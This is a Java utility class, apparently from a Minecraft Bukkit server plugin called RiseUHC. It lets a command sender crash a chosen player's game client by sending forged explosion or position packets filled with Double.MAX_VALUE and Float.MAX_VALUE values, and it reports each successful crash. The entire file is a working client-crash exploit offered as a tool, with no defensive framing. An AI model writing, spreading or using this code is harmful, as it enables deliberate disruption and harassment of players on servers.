package me.swerve.riseuhc.util;

import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.PacketPlayOutPosition;
import net.minecraft.server.v1_8_R3.Vec3D;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;
import java.util.Collections;


public class CrashUtils {

    public static void crashPlayer(CommandSender crasher, Player victim, CrashType crashType) {
        try {
            switch (crashType) {
                case EXPLOSION:
                    net.minecraft.server.v1_8_R3.Vec3D vec3d = new Vec3D(d(), d(), d());
                    PacketPlayOutExplosion explosionPacket = new PacketPlayOutExplosion(d(), d(), d(), f(), Collections.emptyList(), vec3d);

                    (((CraftPlayer) victim).getHandle()).playerConnection.sendPacket(explosionPacket);
                    break;
                case POSITION:
                    PacketPlayOutPosition playOutPositionConstructor = new PacketPlayOutPosition(d(), d(), d(), f(), f(), Collections.emptySet());

                    (((CraftPlayer) victim).getHandle()).playerConnection.sendPacket(playOutPositionConstructor);
                    break;
            }

            crasher.sendMessage("§f[§6RiseUHC§f] " + "§aCrashed §2" + victim.getName() + " §ausing §3" + crashType.name() + " §amethod!");

        } catch (Exception e) {
            crasher.sendMessage("§f[§6RiseUHC§f] " + "§cFailed to crash §e" + victim.getName() + " §eusing " + crashType.name() + " §cmethod!");

            System.err.println("[CRASHER] Failed to crash " + victim.getName() + " using " + crashType.name() + "!");
            e.printStackTrace();
        }

    }

    private static Double d() {
        return Double.MAX_VALUE;
    }

    private static Float f() {
        return Float.MAX_VALUE;
    }
}